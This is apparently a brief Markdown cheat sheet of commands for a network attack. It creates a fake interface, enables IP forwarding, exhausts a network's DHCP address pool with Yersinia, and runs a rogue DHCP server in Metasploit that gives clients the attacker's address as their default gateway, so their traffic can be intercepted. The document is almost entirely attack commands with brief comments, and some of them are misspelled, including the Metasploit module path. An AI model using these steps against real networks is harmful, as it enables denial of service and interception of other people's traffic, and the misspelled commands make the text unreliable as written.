## tool
---

#### Yersinia
* create fake interface to work
```
ifconfig eth0:1 192.168.1.3 netmask 255.255.255.0
```

* route traffic that will come to fake int to original gateway by using route
```
route add default gw 192.168.1.1 eth0:1
```

* enable IP forwarding
```
cat /proc/sys/net/ipv4/ip_forward
// change its value to 1
```

### then

### dhcp starwation (make all ip full of dhcp)
```
yersinia dhcp -attack 1
```

### For rogue sever
> it will make our dhcp sever , a fake dhcp that will use in network now
* also can use yersinia
* using metasploit 
```
use auxiliar/server/dhcp

//options to use

set DHCPSTART 192.168.1.80
//starting of ip 

set DHCPEND 192.168.1.190

set DHCPSEVER 8.8.8.8

set NETMASK 255.255.255.0

set ROUTER 192.168.1.3
// set ip of fake interface you create , it will assing this ip as default gateway for clients

set SRVHOST 192.168.1.4
// ip of dhcp server that clients will see
// use any ip , new ip
```